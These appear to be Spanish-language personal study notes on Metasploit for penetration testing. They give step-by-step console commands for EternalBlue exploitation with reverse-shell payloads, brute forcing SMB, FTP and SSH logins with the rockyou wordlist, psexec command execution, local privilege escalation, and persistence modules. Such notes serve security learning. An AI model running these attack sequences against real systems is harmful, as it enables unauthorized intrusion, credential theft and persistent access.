
---------

- Iniciar Metasploit 

```bash
msfconsole
```

#### - Buscar Exploit de alguna vulnerabilidad Conocida

```bash
search ms17-010 # Vulnerabilidad de Eternal blue (smb)
search CVE-2011-2523 # Bucar por la vulnerabilidad
search vsFTPd 2.3.4 # Buscar  por la version del sistema
```

![[Pasted image 20251018143139.png]]
- Mostrar Opciones

```bash
show options
```

- Usar un modulo de Explotacion de acuerdo a la vulnerabilidad 

```bash
use exploit/windows/smb/ms17_010_eternalblue 
```


- Setear en metaesploit el destino que se quiere atacar 

```bash
set RHOSTS 10.201.29.171 # ip de la maquina victima -> Remote Hosts
set RPORT 445 # Puerto de la ataque de la maquina victima -> Remote Port
```

- Setear una ReversShell por TCP - El payload es la carga util que se ejecutara una vez se haga la intrusión a la maquina victima 

```bash
set payload windows/x64/shell/reverse_tcp  # Se envia una reverse shell
```

- Configuración de escucha mediante el cual recibiremos la carga útil del payload 
```bash
set LHOST 10.201.29.171 # Ip de Atacante en donde entablaremos conexion 
set LPORT 4444 # Puerto de Atacante en donde entablaremos conexion
```

--- 
#### Explotación del Protocolo SMB 

*Para mas info podemos ver [[p445 - SMB - Server Message Block]] *

Un modulo que nos servirá para la explotación del protocolo smb es el siguiente:

```bash
msfconsole # Activamos metaesploit 
use auxiliary/scanner/smb/smb_login # Usamos el modulo de ataque 
showoptions
set RHOSTS <IpVictima>
set SMBUser <Usuario> # Lo colocamos en caso de saber cual es el usurio
set PASS_FILE /usr/share/wordlist/rockyou.txt # Cargamos el diccionario del cual queremos hacer el ataque de fuerza bruta
set VERBOSE false
run
```

- Luego de esto podemos probar si podemos tener control remoto de la maquina de la siguiente forma:

```bash
use exploit/windows/smb/psexec # modulo psexec para saber si podemos hacer ejecucion de comandos
show options 
set RHOSTS <Ipvictima>
set SMBUser <Usuario>
set SMBPass <Contraseña>
run    # Puede fallar si no esta habilidato el control remoto por psexec 
```

---
# Comandos comunes dentro de la maquina Victima

#### Linux 

```bash
shell # Te abre una consola en formato bash
```

#### Windows

- *nt authority/system* es el usuario administrador


---
### Ataques de Fuerza Bruta 

Se pueden realizar ataques de fuerza bruta con el siguiente modulo. Va un poco mas lento que [[Hydra]]

###### Ftp 

```bash
search ftp_login  # Busca el modulo 
use 0 
show options
set PASS_FILE /usr/share/wordlist/rockyou.txt
set USERNAME juan
set RHOSTS <IpVictima>
run
```

###### ssh

```bash
search ssh_login  # Busca el modulo 
use 0 
show options
set PASS_FILE /usr/share/wordlist/rockyou.txt
set USERNAME juan
set RHOSTS <IpVictima>
run
```
---
#### Escalada de privilegios en Windows con metaesploit 

- Para poder escalar privilegios de este modo lo mas aconsejable es vulnerar el sistema con una sesión de meterpreter como aparece en [[Metasploit]]

```bash
meterpreter >
				background        # poner la sesion en 2 plano 
				search local_exploit_suggester    # Buscar el modulo de escalada de privilegios
				use 0                             # Usar el modulo 
				show options
				sessions -l                       # Buscar las sesiones que tenemos activas
				set SESSION 1                     # Seteamos la sesion que habiamos dejado en 2 plano con su ID
				run
```

- Aqui nos aparecerán muchas formas de escalar privilegios, de las cuales probaremos una a una de las que están en verdes hasta que funcionen:

![[Pasted image 20251022195026.png]]

- Haremos lo siguiente:

```bash
use exploit/windows/local/tokenmagic   # seteamos el exploit que queramos
show options 
set SESSION 1           # Seteamos el ID de la sesion que teniamos
set LHOST <IpAtacante>  # seteamos nuestra ip
set LPORT 5555          # Cambiamos el puerto a uno que no estemos usando para evitar problemas de compatibilidad
```

- Con `sessions -i <ID>` podemos volver a la sesión que ya teníamos abierta 

---
# Guia Basica

Metasploit es una herramienta poderosa para pruebas de penetración, análisis de seguridad y explotación de vulnerabilidades en redes y sistemas. Aquí tienes una guía básica para empezar con Metasploit:

### 1. **Introducción a Metasploit**

Metasploit Framework es una plataforma de código abierto que contiene módulos de explotación, payloads (cargas útiles), encoders (codificadores), entre otros. Es utilizado por profesionales de la seguridad para realizar pruebas de penetración en sistemas con permisos apropiados.

### 2. **Instalación de Metasploit**

Para usar Metasploit, puedes instalarlo en sistemas basados en Linux (como Kali Linux, que lo trae preinstalado) o en Windows. La instalación varía según el sistema operativo:

- **En Kali Linux**: Generalmente, ya está instalado.
- **En Ubuntu**:
    
    
    `curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/installer/setup.sh | bash`
    
- **En Windows**: Descarga el instalador desde la página oficial de Rapid7.

### 3. **Iniciar Metasploit**

Para comenzar a utilizar Metasploit, abre una terminal y escribe:


`msfconsole`

### 4. **Estructura de Metasploit**

Metasploit tiene varios componentes clave:

- **Exploit**: Código que toma ventaja de una vulnerabilidad específica.
- **Payload**: Código que se ejecuta en el sistema objetivo después de que se haya explotado la vulnerabilidad.
- **Auxiliary**: Herramientas auxiliares para realizar tareas como escaneo, reconocimiento, etc.
- **Post**: Módulos de post-explotación que se utilizan después de comprometer un sistema para realizar tareas de mantenimiento y extracción de información.

### 5. **Escaneo y reconocimiento**

Antes de explotar una vulnerabilidad, necesitas información sobre el objetivo. Metasploit tiene módulos auxiliares para esta etapa:

- **Escaneo de puertos**:
-
    `use auxiliary/scanner/portscan/tcp set RHOSTS <IP_del_objetivo> run`
    
- **Escaneo de servicios**:
    

    `use auxiliary/scanner/http/title set RHOSTS <IP_del_objetivo> run`
    

### 6. **Buscar exploits**

Puedes buscar exploits para aplicaciones o sistemas vulnerables:


`search nombre_del_servicio`

Ejemplo:



`search vsftpd`

### 7. **Configurar un exploit**

Una vez encontrado el exploit adecuado, configúralo:


`use exploit/path/al/exploit set RHOST <IP_del_objetivo> set RPORT <puerto_del_servicio>`

### 8. **Configurar el payload**

Elige el payload a ejecutar en el sistema vulnerable:


`set PAYLOAD windows/meterpreter/reverse_tcp set LHOST <IP_tuya> set LPORT <puerto>`

### 9. **Ejecutar el exploit**

Finalmente, ejecuta el exploit:


`exploit`

Si el exploit es exitoso, tendrás acceso al sistema remoto.

### 10. **Post-explotación**

Metasploit ofrece varios módulos de post-explotación para extraer información o mantener el acceso:

- **Ejemplo**: Enumerar usuarios
    
    
    `use post/windows/gather/enum_logged_on_users set SESSION <ID_de_la_sesion> run`
    

### 11. **Salir de Metasploit**

Para salir de Metasploit, simplemente escribe:

bash

Copy code

`exit`

---------

Iniciar la aplicación 

```
msfdb run 
```

La mayoria de exploits estan programadpos en ruby

La ruta de metaesplot es usr/share/metaesplot-framework

Se pueden configurar espacios de trabajp de ña sifguiente fotma 

![[Pasted image 20241103230822.png]]

Con el comando shell desde metaesploit listener podemos conseguir una consola interactiva de bash para poder ejecutar los comandos que queramos 

Podemos dejar en segundo plano las sessiones de la siguiente manera 

![[Pasted image 20241103233554.png]]


Podemos filtrar por exploits de persisetncia de la siguiente manera 

![[Pasted image 20241103233702.png]]

![[Pasted image 20241103234136.png]]


Posteriormente de Sertear el script de persistencia y de setear la session que queremos, le daboas a run y ya en un modiulo normal de metaesploit como el multihandler podriamos volvernos a concetar a las sessiones




